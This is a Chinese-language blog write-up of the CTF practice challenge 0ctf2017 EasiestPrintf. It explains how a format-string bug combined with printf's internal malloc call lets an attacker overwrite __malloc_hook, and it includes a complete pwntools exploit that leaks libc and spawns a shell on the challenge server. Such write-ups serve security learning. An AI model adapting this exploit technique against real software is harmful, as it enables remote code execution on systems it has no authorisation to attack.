<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>BUU-0ctf2017_easiestprintf-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="明天就考四级了，前几天也是事情一大堆，还有个2077，昨天甚至没有写题，考虑到我岌岌可危的绩点，我现在准备放慢pwn学习的节奏了，之前花的时"><meta property="og:image" content><meta property="og:title" content="BUU-0ctf2017_easiestprintf-WP"><meta property="og:description" content="明天就考四级了，前几天也是事情一大堆，还有个2077，昨天甚至没有写题，考虑到我岌岌可危的绩点，我现在准备放慢pwn学习的节奏了，之前花的时"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/buu-0ctf2017_easiestprintf-wp.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-12-11T22:35:00+00:00"><meta property="article:modified_time" content="2020-12-11T22:35:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="BUU-0ctf2017_easiestprintf-WP"><meta name=twitter:description content="明天就考四级了，前几天也是事情一大堆，还有个2077，昨天甚至没有写题，考虑到我岌岌可危的绩点，我现在准备放慢pwn学习的节奏了，之前花的时"><script src=https://www.cjovi.icu/js/feather.min.js></script>
<link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.bfb8dec0e2220d86f104bd8230dbf2c35b583e46ccfef90bb620854db94ef7a5.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>BUU-0ctf2017_easiestprintf-WP</h1><div class=meta>Posted on Dec 11, 2020</div></div><section class=body><p>明天就考四级了，前几天也是事情一大堆，还有个2077，昨天甚至没有写题，考虑到我岌岌可危的绩点，我现在准备放慢pwn学习的节奏了，之前花的时间挺多的，投入到数学上的时间也确实太有限了。之后就考虑每天刷道水题维持下手感吧，新的知识看着学，如果没新知识WP也就只简单地贴个exp吧。虽然在寒假前没有啃下堆有点遗憾，但是也只好这样了。</p><p>这道题呢其实我没有做出来，名字取得就很劝退，看WP的时候也都说这题简单，有一点受伤呜呜呜。此题主要的是开启了full reload，所以无法hijack got，查阅wp才知道printf在输出的字符串太长（经我测试，长为五万的时候还不算太长，十万左右就算太长了，这个是没有明确限定的，应该是在处理格式化占位符的输出的时候会考虑调用，这里前两个格式化占位符进行覆写，不会调用malloc，最后一个格式化占位符实现调用）的时候会调用malloc来申请一些空间来缓冲，并在输出完后free掉。所以这里我们可以考虑通过输出过长的字符串先劫持__malloc_hook或者__free_hook（当钩子在不为零时，malloc和free就会call对应的钩子）并执行之。libc我通过之前的泄露点泄露了两个函数的低十二位用Libcdatabase找了出来，直接使用one_gadget找到execve。我先尝试了free_hook，失败了，用malloc_hook就可以了（具体的原因不太了解，one_gadget找出的确实容易出现问题，过于依赖这个也确实不是好习惯）。最后的exp</p><pre class=wp-block-code><code>from pwn import *                                                                            
context(log_level = 'debug')                                                                 
                                                                                             
Libc = ELF("./libc.so")                                                                      
elf = ELF("./EasiestPrintf")                                                                 
                                                                                             
sh = remote("node3.buuoj.cn","29224")                                                        
#sh = process(['./EasiestPrintf'],env={"LD_PRELOAD":"./libc.so"})                            
read_got = elf.got["read"]                                                                   
                                                                                             
sh.sendlineafter("Which address you wanna read:\n",str(read_got))                            
read_addr = int(sh.recvuntil('\n',drop = True),base = 16)                                    
print hex(read_addr)                                                                         
                                                                                             
libc_base = read_addr - Libc.symbols["read"]                                                 
execv_addr = libc_base + 0x3a812                                                             
malloc_hook_got = libc_base + Libc.symbols["__malloc_hook"]                                  
                                                                                             
if (execv_addr&0xffff) > (execv_addr>>16):                                                   
    payload = p32(malloc_hook_got) + p32(malloc_hook_got + 2)                                
    payload += '%' + str((execv_addr>>16) - 8) + 'c' + '%8$hn'                               
    payload += '%' + str((execv_addr&0xffff) - (execv_addr>>16)) + 'c' + '%7$hn' + '%100000c'  
else:                                                                                        
    payload = p32(malloc_hook_got) + p32(malloc_hook_got + 2)                                
    payload += '%' + str((execv_addr&0xffff) - 8) + 'c' + '%7$hn'                            
    payload += '%' + str((execv_addr>>16) - (execv_addr&0xffff)) + 'c' + '%8$hn' + '%100000c'  
                                                                                             
sh.sendline(payload)                                                                         
sh.interactive()                                                                               </code></pre><p>这一篇写的很简陋，也确实是没什么时间</p></section><div class=post-tags></div><script src=https://giscus.app/client.js data-repo=chujDK/chujdk.github.io data-repo-id=R_kgDOI__mNg data-category=Announcements data-category-id=DIC_kwDOI__mNs4CYoyP data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a><a class=soc href=mailto:chujj31@gmail.com rel=me title=Mail><i data-feather=mail></i></a>
<a class=border></a><a class=soc href=https://www.cjovi.icu/index.xml rel=me title=Rss><i data-feather=rss></i></a>
<a class=border></a></div><div class=footer-info>&nbsp2020 ~ 2023  © chuj |  Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>